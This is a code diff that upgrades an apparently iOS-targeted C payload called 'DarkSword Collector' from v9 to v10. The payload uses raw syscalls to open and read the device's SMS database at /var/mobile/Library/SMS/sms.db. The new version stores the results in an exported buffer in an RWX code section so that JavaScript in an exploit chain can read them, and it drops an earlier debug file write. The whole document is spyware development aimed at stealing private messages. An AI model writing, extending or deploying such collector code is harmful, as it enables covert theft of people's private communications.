@@ -1,9 +1,10 @@
 /**
- * DarkSword Collector v9 - Debug: stderr to verify syscalls work
- * NO global variables (stack only, no __DATA segment)
+ * DarkSword Collector v10 - Buffer in __TEXT,__text (code section, RWX)
+ * Exported _result_buf and _result_len for JS to read via cDylibBuf
  */
 
 static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
+static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
 static int _itoa(int val, char *buf) {
     int i=0; char tmp[16]; int t=0;
     if(val==0){buf[0]='0';buf[1]=0;return 1;}
@@ -37,17 +38,33 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_open  5
 #define SYS_read  3
 #define SYS_close 6
-#define SYS_write 4
 
 static void _stderr(const char *msg) {
-    _svc3(SYS_write, 2, (long)msg, _strlen(msg));
+    _svc3(4, 2, (long)msg, _strlen(msg));
 }
 
+/* Exported buffers in __TEXT,__text (mapped RWX by MachOPayloadBuilder) */
+__attribute__((used)) char _result_buf[512];
+__attribute__((used)) int _result_len;
+
+static void _append(const char *s) {
+    int sl = _strlen(s);
+    int pos = _result_len;
+    if (pos + sl < 511) {
+        _memcpy(_result_buf + pos, s, sl);
+        _result_len = pos + sl;
+        _result_buf[_result_len] = 0;
+    }
+}
+static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }
+
 void ds_start(void) {
-    _stderr("[v9] entered\n");
+    _result_buf[0] = 0;
+    _result_len = 0;
+    _stderr("[v10] start\n");
 
     int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
-    _stderr("[v9] open fd=");
+    _stderr("[v10] fd=");
     char fb[8]; _itoa(fd, fb); _stderr(fb); _stderr("\n");
 
     if (fd >= 0) {
@@ -55,29 +72,20 @@ void ds_start(void) {
         int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data)-1);
         _svc1(SYS_close, fd);
         if (n < 0) n = 0;
+        data[n] = 0;
 
-        _stderr("[v9] read=");
-        char nb[8]; _itoa(n, nb); _stderr(nb); _stderr("\n");
-
-        _stderr("[v9] hex=");
-        for (int i = 0; i < 16 && i < n; i++) {
-            char h[3]; h[0]="0123456789abcdef"[(unsigned char)data[i]>>4];
-            h[1]="0123456789abcdef"[(unsigned char)data[i]&0xf]; h[2]=0;
-            _stderr(h);
-        }
-        _stderr("\n");
+        _append("{\"SMS\":{\"ok\":true,\"size\":");
+        _append_int(n);
+        _append("}}");
+    } else {
+        _append("{\"SMS\":{\"ok\":false,\"fd\":");
+        _append_int(fd);
+        _append("}}");
     }
 
-    int wfd = (int)_svc2(SYS_open, (long)"/tmp/ds_test.txt", 0x601);
-    _stderr("[v9] wfd=");
-    char wb[8]; _itoa(wfd, wb); _stderr(wb); _stderr("\n");
-
-    if (wfd >= 0) {
-        const char *t = "collector v9 was here\n";
-        _svc3(SYS_write, wfd, (long)t, _strlen(t));
-        _svc1(SYS_close, wfd);
-        _stderr("[v9] wrote file\n");
-    }
-
-    _stderr("[v9] done\n");
+    _stderr("[v10] len=");
+    char rlb[8]; _itoa(_result_len, rlb); _stderr(rlb);
+    _stderr(" buf[0]=");
+    char bb[4]; bb[0]=_result_buf[0]; bb[1]=0; _stderr(bb);
+    _stderr("\n[v10] done\n");
 }
